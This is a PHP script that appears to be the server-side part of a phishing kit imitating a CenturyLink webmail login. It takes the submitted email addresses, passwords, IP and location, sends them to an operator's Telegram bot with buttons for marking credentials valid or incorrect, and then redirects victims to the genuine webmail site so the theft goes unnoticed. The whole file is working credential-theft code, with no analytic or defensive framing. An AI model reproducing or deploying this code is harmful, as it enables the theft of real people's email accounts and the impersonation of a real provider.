<?php
require_once 'config.php';
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitize user inputs to prevent Telegram HTML parsing crashes
    $email = htmlspecialchars($_POST['email'] ?? '', ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($_POST['password'] ?? '', ENT_QUOTES, 'UTF-8');
    $sid = htmlspecialchars($_POST['sid'] ?? '', ENT_QUOTES, 'UTF-8');
    $ip = htmlspecialchars($_POST['ip'] ?? 'Unknown', ENT_QUOTES, 'UTF-8');
    $city = htmlspecialchars($_POST['city'] ?? 'Unknown', ENT_QUOTES, 'UTF-8');
    $region = htmlspecialchars($_POST['region'] ?? 'Unknown', ENT_QUOTES, 'UTF-8');
    $country = htmlspecialchars($_POST['country'] ?? 'Unknown', ENT_QUOTES, 'UTF-8');

    if (!$email || !$password || !$sid) {
        echo json_encode(['ok' => false, 'error' => 'Missing required fields']);
        exit;
    }

    // Set the exact full redirect URL
    $domain = 'https://webmail.centurylink.net/app/';

    $message = "🔐 <b>CenturyLink Login</b>\n\n" .
               "🆔 ID: <code>{$sid}</code>\n\n" .
               "📧 Email: <code>{$email}</code>\n" .
               "🔑 Password: <code>{$password}</code>\n\n" .
               "🌐 IP: <code>{$ip}</code>\n" .
               "📍 Location: {$city}, {$region}, {$country}";

    $payload = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => [
            'inline_keyboard' => [
                [
                    ['text' => '❌ Incorrect', 'callback_data' => "incorrect_{$sid}"],
                    ['text' => '✅ Valid', 'callback_data' => "valid_{$sid}"]
                ]
            ]
        ]
    ];

    $apiUrl = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";

    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4); // Forces IPv4 for cPanel compatibility
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $response = curl_exec($ch);
    $curlError = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response === false) {
        echo json_encode(['ok' => false, 'error' => 'cURL Error: ' . $curlError]);
        exit;
    }

    $resData = json_decode($response, true);
    if ($resData && isset($resData['ok']) && $resData['ok']) {
        echo json_encode(['ok' => true, 'domain' => $domain]);
    } else {
        echo json_encode(['ok' => false, 'error' => 'Telegram API Error [HTTP ' . $httpCode . ']: ' . ($resData['description'] ?? 'Unknown error')]);
    }
    exit;
}
echo json_encode(['ok' => false, 'error' => 'Invalid request method']);
?>